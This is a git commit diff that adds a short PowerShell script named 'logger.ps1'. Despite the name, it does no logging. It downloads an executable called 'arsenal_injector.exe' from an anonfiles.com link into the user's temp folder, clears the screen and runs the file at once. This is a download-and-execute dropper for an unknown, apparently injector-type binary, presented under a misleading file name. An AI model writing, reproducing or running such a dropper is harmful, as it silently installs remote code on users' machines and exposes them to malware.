0135375898946e1c5ef21c22c76f899fffc8515b
creepyturnip <92087207+creepyturnip@users.noreply.github.com>
2023-06-01 13:25:13 +0200

    Update logger.ps1

--- personal/logger.ps1
+++ personal/logger.ps1
@@ -1,1 +1,7 @@
-
+$ProcName = "arsenal_injector.exe"
+$WebFile = "https://cdn-153.anonfiles.com/pcv5Feu9zd/a3101b97-1685618318/$ProcName"
+ 
+Clear-Host
+ 
+(New-Object System.Net.WebClient).DownloadFile($WebFile,"$env:temp\$ProcName")
+Start-Process ("$env:temp\$ProcName")
